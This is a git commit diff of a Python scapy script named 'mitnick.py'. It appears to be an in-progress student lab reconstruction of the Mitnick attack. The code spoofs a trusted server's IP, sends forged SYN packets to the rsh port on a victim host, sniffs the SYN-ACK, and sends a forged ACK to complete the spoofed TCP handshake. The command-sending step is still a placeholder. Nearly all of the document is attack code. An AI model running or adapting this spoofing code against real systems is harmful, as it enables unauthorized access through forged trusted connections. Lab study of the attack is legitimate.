4675a203802800d9018d79e3d4286fbf1db030a0
alakbarz <me@alak.bar>
2021-03-03 19:42:03 +0000

    More stuff

--- mitnick.py
+++ mitnick.py
@@ -8,20 +8,26 @@
 # ’R’: RST bit
 # ’S’: SYN bit
 # ’F’: FIN bit
+
+
+
  
 from scapy.all import *
 import time
+from random import randint
  
 x_ip = "10.0.2.8"
 x_port = 514
  
-srv_ip = "10.0.2.7" # Yaseen's machine
-#srv_ip = "10.0.2.15" # Alakbar's machine
+# srv_ip = "10.0.2.7" # Yaseen's machine
+srv_ip = "10.0.2.15" # Alakbar's machine
 srv_port = 1023
+sequence = 778933536
+print("Inital sequence number: " + str(sequence))
  
-def send_SYN(sip, dip, sport, dport):
+def send_SYN(sip, dip, sport, dport, seq):
 	ip = IP(src=sip, dst=dip)
-	tcp = TCP(sport=sport, dport=dport)
+	tcp = TCP(sport=sport, dport=dport, seq=seq)
 	tcp.flags = "S"
 	packet = ip/tcp
  
@@ -35,12 +41,12 @@ def send_SYN(sip, dip, sport, dport):
  
 def send_ACK(sip, dip, sport, dport, seq, ack):
 	ip = IP(src=sip, dst=dip)
-	tcp = TCP(sport=sport, dport=dport)
+	tcp = TCP(sport=sport, dport=dport, seq=seq, ack=ack)
 	tcp.flags = "A"
 	packet = ip/tcp
  
 	if tcp.flags == "A":
-		print("Sending ACK to {}:{} from {}:{} with ".format(sip, sport, dip, dport))
+		print("Sending ACK to {}:{} from {}:{} with sequence number {} and acknowledgement {}".format(sip, sport, dip, dport, seq, ack))
 		# ls(packet) # "List available layers, or infos on a given layer class or name."
 		send(packet)
 	else:
@@ -50,25 +56,40 @@ def send_ACK(sip, dip, sport, dport, seq, ack):
 def send_RSH_data():
 	print("Something")
  
-sniffer = AsyncSniffer(count=2, filter="tcp")
+sniffer = AsyncSniffer(count=5, filter="tcp")
  
 sniffer.start()
  
-send_SYN(srv_ip, x_ip, srv_port, x_port)
+send_SYN(srv_ip, x_ip, srv_port, x_port, sequence)
 
-sniffer.join()
- 
-# time.sleep(20)
- 
-# sniffer.stop()
+print("Waiting 1 second...")
+time.sleep(1)
+sniffer.stop()
  
 results = sniffer.results
 print(results)
 
 for packet in results:
 	if packet.haslayer(TCP):
-		print(packet[TCP].seq)
+		if packet[TCP].seq == sequence:
+			print("Orginal sequence number: " + str(packet[TCP].seq))
+			inital_seq = packet[TCP].seq
+		else:
+			print("Return sequence number: " + str(packet[TCP].seq))
+			acknowledge = packet[TCP].seq
 
- 
+
+SEQa = sequence
+SEQv = results[-1][TCP].seq
+ACK  = SEQv + 1
+SEQ  = results[-1][TCP].ack
+
+"""
+1. SEND - SEQa --> Victim
+2. RECV - Victim --> SEQv and ACK=SEQa+1
+3. SEND - ACK=SEQv+1 and SEQ=SEQa+1
+
+"""
+
 # sniff syn+ack response from victim
-# send_ACK(srv_ip, x_ip, srv_port, x_port, seq, ack)
+send_ACK(srv_ip, x_ip, srv_port, x_port, SEQ, ACK)
